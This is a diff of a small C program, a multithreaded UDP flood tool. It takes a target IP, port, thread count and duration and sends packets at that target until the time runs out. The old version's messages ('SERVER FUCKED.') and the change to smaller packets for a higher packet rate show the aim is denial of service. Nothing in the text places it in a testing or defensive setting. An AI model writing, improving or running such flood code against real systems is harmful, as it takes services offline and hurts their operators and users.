@@ -1,78 +1,70 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <pthread.h>
 #include <string.h>
-#include <unistd.h>
+#include <pthread.h>
 #include <arpa/inet.h>
+#include <unistd.h>
 #include <time.h>
+#include <fcntl.h>
 
-#define THREAD_COUNT 100
-#define PACKET_SIZE 4096  // Size of the packets sent
+#define PACKET_SIZE 128  // Optimized for high packet rate
 
 typedef struct {
-    char *ip;
-    int port;
-    int duration;
-} thread_data_t;
+    struct sockaddr_in server;
+    time_t end_time;
+} ThreadArgs;
 
-void* send_powerful_traffic(void* arg) {
-    thread_data_t *data = (thread_data_t *)arg;
-    struct sockaddr_in server_addr;
-    int sock;
-    char packet[PACKET_SIZE];
-    time_t start_time = time(NULL);
+void* udp_flood(void* arg) {
+    ThreadArgs* args = (ThreadArgs*)arg;
+    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 
-    // Fill the packet with random data
-    memset(packet, 'A', PACKET_SIZE);
+    // Optional: set socket to non-blocking
+    // fcntl(sock, F_SETFL, O_NONBLOCK);
 
-    // Setup server address structure
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(data->port);
-    inet_pton(AF_INET, data->ip, &server_addr.sin_addr);
+    char payload[PACKET_SIZE];
+    memset(payload, 'A', PACKET_SIZE);
 
-    // Create socket
-    sock = socket(AF_INET, SOCK_DGRAM, 0);  // Using UDP for fast traffic generation
-    if (sock < 0) {
-        perror("Socket creation failed");
-        pthread_exit(NULL);
-    }
-
-    // Continuously send packets until the time runs out
-    while (time(NULL) - start_time < data->duration) {
-        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
-        printf("Sent powerful packet to %s:%d\n", data->ip, data->port);
+    while (time(NULL) < args->end_time) {
+        sendto(sock, payload, PACKET_SIZE, 0, (struct sockaddr*)&args->server, sizeof(args->server));
     }
 
     close(sock);
-    pthread_exit(NULL);
+    free(args);  // clean up allocated args
+    return NULL;
 }
 
-int main(int argc, char *argv[]) {
-    if (argc != 4) {
-        printf("Usage: ./IPxKINGYT <IP> <Port> <Time>\n", argv[0]);
-        return -1;
+int main(int argc, char* argv[]) {
+    if (argc != 5) {
+        printf("Usage: %s <IP> <Port> <Threads> <Time (seconds)>\n", argv[0]);
+        return 1;
     }
 
-    char *ip = argv[1];
-    int port = atoi(argv[2]);
-    int duration = atoi(argv[3]);
+    struct sockaddr_in server;
+    server.sin_family = AF_INET;
+    server.sin_port = htons(atoi(argv[2]));
+    inet_pton(AF_INET, argv[1], &server.sin_addr);
 
-    pthread_t threads[THREAD_COUNT];
-    thread_data_t thread_data = {ip, port, duration};
+    int threads = atoi(argv[3]);
+    int duration = atoi(argv[4]);
+    time_t end_time = time(NULL) + duration;
 
-    // Create 100 threads
-    for (int i = 0; i < THREAD_COUNT; i++) {
-        if (pthread_create(&threads[i], NULL, send_powerful_traffic, &thread_data) != 0) {
-            perror("Thread creation failed");
-            return -1;
-        }
+    printf("Starting UDP flood on %s:%d for %d seconds using %d threads.\n",
+           argv[1], atoi(argv[2]), duration, threads);
+
+    pthread_t thread_pool[threads];
+
+    for (int i = 0; i < threads; i++) {
+        ThreadArgs* args = malloc(sizeof(ThreadArgs));
+        args->server = server;
+        args->end_time = end_time;
+
+        pthread_create(&thread_pool[i], NULL, udp_flood, args);
     }
 
-    // Wait for all threads to finish
-    for (int i = 0; i < THREAD_COUNT; i++) {
-        pthread_join(threads[i], NULL);
+    for (int i = 0; i < threads; i++) {
+        pthread_join(thread_pool[i], NULL);
     }
 
-    printf("SERVER FUCKED.\n");
+    printf("UDP flood completed.\n");
     return 0;
 }
